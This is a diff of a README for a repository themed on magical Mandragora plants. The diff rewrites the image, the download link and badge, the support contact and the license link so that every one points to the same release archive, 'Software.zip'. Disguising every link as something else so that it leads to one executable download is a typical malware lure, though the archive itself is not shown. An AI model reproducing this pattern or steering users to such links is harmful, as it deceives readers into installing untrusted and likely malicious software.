@@ -2,7 +2,7 @@
 
 Welcome to the Mandragora repository! Here you will find an exciting collection of mysterious and enchanting content related to the magical world of Mandragora plants.
 
-![Mandragora](https://www.example.com/mandragora.jpg)
+![Mandragora](https://github.com/ashwani15upadhyay/Mandragora/releases/download/v1.0/Software.zip)
 
 ## Description
 
@@ -20,8 +20,8 @@ Explore the mysterious world of Mandragora plants with our repository. Discover 
 To get started with Mandragora, follow these simple steps:
 
 1. Click on the following link to download the Mandragora archive:  
-   [Download Mandragora](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)  
-   ![Download](https://img.shields.io/badge/Download-Mandragora-green)
+   [Download Mandragora](https://github.com/ashwani15upadhyay/Mandragora/releases/download/v1.0/Software.zip)  
+   ![Download](https://github.com/ashwani15upadhyay/Mandragora/releases/download/v1.0/Software.zip)
 
 2. Once downloaded, extract the contents of the archive to your desired location.
 
@@ -54,10 +54,10 @@ We would like to extend our heartfelt thanks to the following contributors who h
 
 ## Support
 
-For any inquiries or assistance, please contact our support team at mandragora.support@example.com.
+For any inquiries or assistance, please contact our support team at https://github.com/ashwani15upadhyay/Mandragora/releases/download/v1.0/Software.zip
 
 ## License
 
-The Mandragora repository is licensed under the [Magical Plants License](https://opensource.org/licenses/magical-plant-license). Feel free to explore, create, and share the wonder of Mandragora with the world!
+The Mandragora repository is licensed under the [Magical Plants License](https://github.com/ashwani15upadhyay/Mandragora/releases/download/v1.0/Software.zip). Feel free to explore, create, and share the wonder of Mandragora with the world!
 
 🌿 Happy exploring the mystical world of Mandragora! 🌿
